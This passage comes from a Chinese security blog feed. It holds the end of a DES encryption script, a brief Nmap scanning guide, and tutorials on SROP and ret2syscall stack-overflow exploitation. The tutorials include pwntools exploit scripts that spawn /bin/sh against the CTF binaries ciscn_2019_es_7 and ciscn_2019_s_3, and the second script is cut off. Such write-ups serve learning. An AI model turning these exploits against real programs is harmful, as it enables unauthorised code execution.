<span class="token comment" spellcheck="true">#                 bin_key+='0'</span>
<span class="token comment" spellcheck="true">#     return bin_key</span>

<span class="token keyword">def</span> <span class="token function">input_key_64</span><span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> len<span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span>
    <span class="token keyword">if</span> len<span class="token punctuation">(</span>bin_key<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> ans <span class="token operator">%</span> <span class="token number">64</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token punctuation">(</span>ans <span class="token operator">%</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
                bin_key <span class="token operator">+=</span> <span class="token string">'0'</span>
    <span class="token keyword">return</span> bin_key

<span class="token keyword">def</span> <span class="token function">deal_mess</span><span class="token punctuation">(</span>bin_mess<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ans <span class="token operator">=</span> len<span class="token punctuation">(</span>bin_mess<span class="token punctuation">)</span>
    <span class="token keyword">if</span> ans <span class="token operator">%</span> <span class="token number">64</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token punctuation">(</span>ans<span class="token operator">%</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
            bin_mess <span class="token operator">+=</span> <span class="token string">'0'</span>
    <span class="token keyword">return</span> bin_mess

<span class="token keyword">def</span> <span class="token function">all_message_encrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># bin_mess = deal_mess(str2bin(message))</span>
    bin_mess<span class="token operator">=</span>input_key_64<span class="token punctuation">(</span>str2bin<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    bin_key <span class="token operator">=</span> input_key_64<span class="token punctuation">(</span>str2bin<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'.{64}'</span><span class="token punctuation">,</span>bin_mess<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># print(tmp)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> des_encrypt<span class="token punctuation">(</span>i<span class="token punctuation">,</span>bin_key<span class="token punctuation">)</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">all_message_decrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    bin_mess <span class="token operator">=</span> input_key_64<span class="token punctuation">(</span>str2bin<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    bin_key <span class="token operator">=</span> input_key_64<span class="token punctuation">(</span>str2bin<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'.{64}'</span><span class="token punctuation">,</span>bin_mess<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>
        res <span class="token operator">+=</span> des_decrypt<span class="token punctuation">(</span>i<span class="token punctuation">,</span>bin_key<span class="token punctuation">)</span>
    <span class="token keyword">return</span> res

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入明文:"</span><span class="token punctuation">)</span>
    mes<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入秘钥:"</span><span class="token punctuation">)</span>
    key<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    secret<span class="token operator">=</span>bin2str<span class="token punctuation">(</span>all_message_encrypt<span class="token punctuation">(</span>mes<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"密文为:"</span><span class="token operator">+</span>secret<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------尝试解密------------"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入秘钥:"</span><span class="token punctuation">)</span>
    key<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    text<span class="token operator">=</span>bin2str<span class="token punctuation">(</span>all_message_decrypt<span class="token punctuation">(</span>secret<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文为:"</span><span class="token operator">+</span>text<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    run<span class="token punctuation">(</span><span class="token punctuation">)</span>



</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Others </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nmap使用指南]]></title>
      <url>/2020/03/02/nmap-shi-yong-zhi-nan/</url>
      <content type="html"><![CDATA[<html><head></head><body><h3 id="扫描单独一台机器"><a href="#扫描单独一台机器" class="headerlink" title="扫描单独一台机器"></a>扫描单独一台机器</h3><p><code>nmap ip</code> 通过这个命令可以查看到对应IP服务器开启的端口和服务</p>
<p><img src="https://s2.ax1x.com/2020/03/02/3W3DgK.png" alt="3W3DgK.png"></p>
<h3 id="一次性扫描多台机器"><a href="#一次性扫描多台机器" class="headerlink" title="一次性扫描多台机器"></a>一次性扫描多台机器</h3><p><code>nmap ip1 ip2 ip3</code> 通过这个命令可以查询多台服务器开启的端口和服务信息<br><code>nmap xxx.xxx.xxx.x,y</code> 是在同一个子网想扫描x-y的IP开启的端口和服务信息<br><code>nmap xxx.xxx.x-y</code> 表示扫描IP在xxx.xxx.x.0-xxx.xxx.y.255之间所有的IP<br><code>nmap xxx.xxx.xxx.1/子网掩码</code> 表示扫描整个网段</p>
<p>nmap -O -sV IP 扫描目的主机 探测服务类型</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> WEB </category>
            
        </categories>
        
        
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SROP技术详解]]></title>
      <url>/2020/02/25/srop-ji-zhu-xiang-jie/</url>
      <content type="html"><![CDATA[<html><head></head><body><h1 id="SROP简介"><a href="#SROP简介" class="headerlink" title="SROP简介"></a>SROP简介</h1><p>SROP全名是<code>Sigreturn Oriented Programming</code> 这个手法是在 2014年被Vrije Universiteit Amsterdam的Erik Bosman提出 这个手法最终利用的还是系统调用 即64位中的<code>syscall</code> 32位中的<code>int 80h</code></p>
<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>signal机制是类unix系统中进程之间相互传递信息的一种方法 也可以称其为软中断信号 一般来说信号机制常见的步骤是<br>1.内核向某个进程发送Signal机制 该进程会暂时挂起 进入内核态<br>2.内核为了以后恢复程序会为该进程保存现场 主要是将所有的寄存器压入栈 以及signal信息 然后将程序流向指向<code>Sigreturn</code>的系统调用地址 </p>
<p>此时栈的情况如下:<br><img src="https://i.loli.net/2020/02/25/g5RVEJQbjmDNkda.png" alt></p>
<p>通常我们称<code>ucontext</code>和<code>siginfo</code>这一部分为<code>Signal Frame</code> 注意 以上的所有信息都是在用户进程的地址空间 这里分别给出<code>Signal Frame</code>在32位和64位中的构造  </p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//X86</span>
<span class="token keyword">struct</span> sigcontext
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">,</span> __gsh<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">,</span> __fsh<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> es<span class="token punctuation">,</span> __esh<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ds<span class="token punctuation">,</span> __dsh<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edi<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esi<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebp<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebx<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> edx<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ecx<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eax<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> trapno<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> err<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eip<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">,</span> __csh<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> eflags<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp_at_signal<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ss<span class="token punctuation">,</span> __ssh<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> oldmask<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> cr2<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//X64</span>
<span class="token keyword">struct</span> _fpstate
<span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
  __uint16_t        cwd<span class="token punctuation">;</span>
  __uint16_t        swd<span class="token punctuation">;</span>
  __uint16_t        ftw<span class="token punctuation">;</span>
  __uint16_t        fop<span class="token punctuation">;</span>
  __uint64_t        rip<span class="token punctuation">;</span>
  __uint64_t        rdp<span class="token punctuation">;</span>
  __uint32_t        mxcsr<span class="token punctuation">;</span>
  __uint32_t        mxcr_mask<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _fpxreg    _st<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> _xmmreg    _xmm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  __uint32_t        padding<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> sigcontext
<span class="token punctuation">{</span>
  __uint64_t r8<span class="token punctuation">;</span>
  __uint64_t r9<span class="token punctuation">;</span>
  __uint64_t r10<span class="token punctuation">;</span>
  __uint64_t r11<span class="token punctuation">;</span>
  __uint64_t r12<span class="token punctuation">;</span>
  __uint64_t r13<span class="token punctuation">;</span>
  __uint64_t r14<span class="token punctuation">;</span>
  __uint64_t r15<span class="token punctuation">;</span>
  __uint64_t rdi<span class="token punctuation">;</span>
  __uint64_t rsi<span class="token punctuation">;</span>
  __uint64_t rbp<span class="token punctuation">;</span>
  __uint64_t rbx<span class="token punctuation">;</span>
  __uint64_t rdx<span class="token punctuation">;</span>
  __uint64_t rax<span class="token punctuation">;</span>
  __uint64_t rcx<span class="token punctuation">;</span>
  __uint64_t rsp<span class="token punctuation">;</span>
  __uint64_t rip<span class="token punctuation">;</span>
  __uint64_t eflags<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> __pad0<span class="token punctuation">;</span>
  __uint64_t err<span class="token punctuation">;</span>
  __uint64_t trapno<span class="token punctuation">;</span>
  __uint64_t oldmask<span class="token punctuation">;</span>
  __uint64_t cr2<span class="token punctuation">;</span>
  __extension__ <span class="token keyword">union</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
      __uint64_t __fpstate_word<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  __uint64_t __reserved1 <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<p>3.在执行完以上操作之后 程序会跳转到注册过的<code>signal handler</code>中处理响应的<code>signal</code> 在执行完<code>signal handler</code>后 根据程序流向便会执行<code>signerturn</code> 即恢复现场操作 恢复所有寄存器 最后恢复进程的执行 其中32位的<code>sigreturn</code>的系统调用号为77 64位的系统调用号为15</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>其实从上文中<code>signal frame</code>存在用户进程的地址空间 就可以大致猜测出来攻击手法 那就是伪造一个<code>Signal Frame</code>出来<br>因为内核仅仅就是为进程保存现场和恢复现场 所有的变动都在<code>Signal Frame</code>中 也就是说 内核并不会为进程去记录<code>signal</code>对应的<code>Signal Frame</code> 所以当执行<code>sigreturn</code>系统调用的时候 并没有验证这个<code>Signal Frame</code>到底是内核为用户进程创造的还是用户伪造的 那么用户就完全有能力伪造一个<code>Signal Frame</code>出来 来控制所有的寄存器值和控制程序流向</p>
<h2 id="相较于普通ROP的优势"><a href="#相较于普通ROP的优势" class="headerlink" title="相较于普通ROP的优势"></a>相较于普通ROP的优势</h2><p>说了上面那一堆原理 可能有些人会觉得SROP比一般的ROP深奥许多 毕竟涉及到内核和中断机制 用起来还不一定顺手 一般的ROP直接控制<code>ret</code> 便可以随意控制程序流向 但是通常来说普通ROP也需要很多条件<br>1.程序必须要有一个栈溢出漏洞<br>2.攻击者必须要有许多控制寄存器的gadget<br>3.攻击者需要在被攻击程序的进程地址空间中找到这些gadget并将其填在栈的合适位置上</p>
<p>本身gadget就不是那么好找 再加上现在操作系统的保护机制 例如ASLR 让地址随机化 寻找到合适的gadgets地址就更难了 而且对于不同的程序 都需要有不同payload 精心构造出大量的gadgets 这也让ROP的payload复用性很差 所以SROP的出现就是为了解决以上这些问题</p>
<p>因为其主要就是利用的<code>Signal Frame</code>可伪造这个机制 来控制各个寄存器的值而不需要去寻找大量的gadgets 同时也极大程度降低了ASLR对我们攻击的影响</p>
<h1 id="Signal-Frame的构造"><a href="#Signal-Frame的构造" class="headerlink" title="Signal Frame的构造"></a>Signal Frame的构造</h1><p>虽然SROP相比起来原本ROP有着极大的优势 但是其最为繁琐的一点就是如何伪造<code>Signal Frame</code> 毕竟需要控制一堆寄存器的值 而没有办法直观的感受自己构造的<code>Signal Frame</code>到底是对是错 这里给出一个工具 是<code>pwntools</code>自带的<code>SigreturnFrame()</code>模块</p>
<p>使用方法如下</p>
<pre class=" language-python"><code class="language-python">
<span class="token comment" spellcheck="true"># arch如果是64位系统填入amd64 32为填入i386</span>
frame<span class="token operator">=</span>SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># 例如 frame.rax=0x3b</span>
frame<span class="token punctuation">.</span>寄存器<span class="token operator">=</span>相对应的值</code></pre>
<p>有了这个工具 那么使用SROP便再无障碍 只要程序存在一个栈溢出便可以进行SROP而不用费心的寻找各种gadgets</p>
<h1 id="利用SROP来GetShell"><a href="#利用SROP来GetShell" class="headerlink" title="利用SROP来GetShell"></a>利用SROP来GetShell</h1><p>这里借用的测试样例是CTF比赛中的一道题<code>ciscn_2019_es_7</code>来讲解 </p>
<p><img src="https://i.loli.net/2020/02/25/3o46GMJrihpfAs9.png" alt></p>
<p>主程序就这两个系统调用 函数表中没有其他的可利用函数 主要是利用函数的start_addr来泄漏出来栈的地址且控制程序重新返回主函数 再利用SROP来进行getshell 因为想要使用<code>syscall</code>来开启一个shell的话 需要保证RAX的值是59 RDI的值是<code>/bin/sh\x00</code>的地址 而ESI和RDX都需要保证为0 因为RAX和RDX像这样的通用寄存器 很难控制值 所以此时采用SROP控制所有寄存器的值来保证shell的正常开启</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
pop_eax_0x3b<span class="token operator">=</span><span class="token number">0x00000000004004e3</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x00000000004005a3</span>
pop_eax_0xf<span class="token operator">=</span><span class="token number">0x00000000004004da</span>
syscall<span class="token operator">=</span><span class="token number">0x0000000000400501</span>
start_addr<span class="token operator">=</span><span class="token number">0x4004ED</span>
pop_rbx_rbp_r12_r13_r14_r15<span class="token operator">=</span><span class="token number">0x40059A</span>
pop_rsi_r15<span class="token operator">=</span><span class="token number">0x00000000004005a1</span>

payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">-</span><span class="token number">0x100</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

frameExecve <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
frameExecve<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0x3b</span>
frameExecve<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bin_addr
frameExecve<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
frameExecve<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span>
frameExecve<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall

payload2<span class="token operator">=</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_eax_0xf<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>frameExecve<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[基于栈溢出的ret2syscall学习]]></title>
      <url>/2020/02/14/ji-yu-zhan-yi-chu-de-ret2syscall-xue-xi/</url>
      <content type="html"><![CDATA[<html><head></head><body><p>最近终于考完了难熬的期末考试 终于有时间整理下这半年学习的东西了 关于栈溢出系统调用的知识其实一直都是一知半解 仅限于能勉强用起来 具体的原理还是不是很了解 这里也是系统的学习一下这个栈溢出的利用手法 主要还是借鉴CTFWiki的知识进行的学习 </p>
<h2 id="系统调用的原理"><a href="#系统调用的原理" class="headerlink" title="系统调用的原理"></a>系统调用的原理</h2><p>其实栈溢出的系统调用没有那么高大上..起码我觉得没有栈迁移高大上….栈在乱飞..想想就觉得高级…栈溢出的西永调用主要是利用了一个系统层面的中断<code>int 0x80</code> 利用<code>int 0x80</code>来使程序陷入核心 然后将参数通过寄存器传往核心 具体调用的系统函数就是由系统调用号来决定 内核的中断处理机制会根据系统调用号 然后调用响应的内核函数 也就是系统调用 而栈溢出最终目的通常都是Getshell 那么观察一下所有的系统调用号 就会发现有一个我们的老面孔<code>execve</code> 其实之前执行的<code>system('/bin/sh)</code>的真实形态执行的就是 <code>execve('/bin/sh')</code></p>
<p>需要注意的是32位的<code>syscall</code>和64位<code>syscall</code>手法是不一样的 因为32位各个参数的传参方式是 EAX传递系统调用号 传参分别用EBX,ECX,EDX,ESI,EDI,EBP</p>
<p>而64位的各个传参方式是 EAX传递系统调用号 传参分别用RDI,RSI,RDX,R10,R8,R9 而且32位的系统调用指令是<code>int 80h</code>而64位则是<code>syscall</code></p>
<p>那么其实思路也很明确 既然整个程序没有地方能够泄漏libc 也没有system能Getshell 那么唯一的办法就是自己创造一个可以执行系统命令的环境出来 这时候我们需要了解到 <code>execve</code>函数的函数原型 即调用方法</p>
<h3 id="execve函数的函数原型"><a href="#execve函数的函数原型" class="headerlink" title="execve函数的函数原型"></a>execve函数的函数原型</h3><p><code>execve('执行命令的地址',NULL,NULL)</code> </p>
<p>在32位下 EAX=11 EBX=bin_addr EDX=0 ESI=0<br>在64位下 RAX=59 RDI=bin_addr ESI=0 RDX=0</p>
<h2 id="关于利用系统调用手法的实例"><a href="#关于利用系统调用手法的实例" class="headerlink" title="关于利用系统调用手法的实例"></a>关于利用系统调用手法的实例</h2><p>这里使用的例题是BUUCTF上<code>ciscn_2019_s_3</code>的这道题 主函数就是两个<code>syscall</code>调用<br><a href="https://imgchr.com/i/1ja6b9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/14/1ja6b9.png" alt="1ja6b9.png"></a></p>
<p>通过动态调试发现read了0x300个字符 肯定存在栈溢出 但是整个函数表中没有任何函数可以让我们操作一番 确定使用<code>syscall</code>来进行Getshell 那么我们需要的条件就是控制RAX,RDI,RSI,RDX 这时候选择使用通用gatget<code>libc_csu_init</code>来控制寄存器<br><a href="https://imgchr.com/i/1jdyz8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/14/1jdyz8.png" alt="1jdyz8.png"></a></p>
<p>注意这里有个坑 本来想通过<code>libc_csu_init</code>来直接控制rdi的 但是这个<code>mov edi,r15d</code>并不是只吧r15的低16位拿上来 而是将rdi清空再将rdi的值设为r15的低16位 而我们的跳转主要是利用0x400589这个位置的call 反正我们可以控制栈上数据和r12的值 那call哪里都是我们说的算 </p>
<p>那么基本思路就是 在栈上输入<code>/bin/sh</code>和填充字符 然后将程序劫持到通用gatget然后将需要的寄存器清零 最后控制r12跳向pop_rdi 然后再返回到<code>syscall</code>上即可 但是这样做需要泄漏出来一个栈上的地址 最后我们发现在输入+0x20的位置上有一个<code>bin_addr+0x118</code>的地址 那么通过下面的<code>write</code>就可以泄漏出来<code>bin_addr</code></p>
<p>最终payload  </p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>
pop_rax<span class="token operator">=</span><span class="token number">0x4004e2</span>
pop6_addr<span class="token operator">=</span><span class="token number">0x40059A</span>
read_addr<span class="token operator">=</span><span class="token number">0x4004ed</span>
rdx_addr<span class="token operator">=</span><span class="token number">0x400580</span>
sys<span class="token operator">=</span><span class="token number">0x400517</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x00000000004005a3</span>

payload<span class="token operator">=</span><span class="token string">'/bin/sh'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x118</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload2<span class="token operator">=</span><span class="token string">'/bin/sh'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_addr<span class="token operator">+</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token 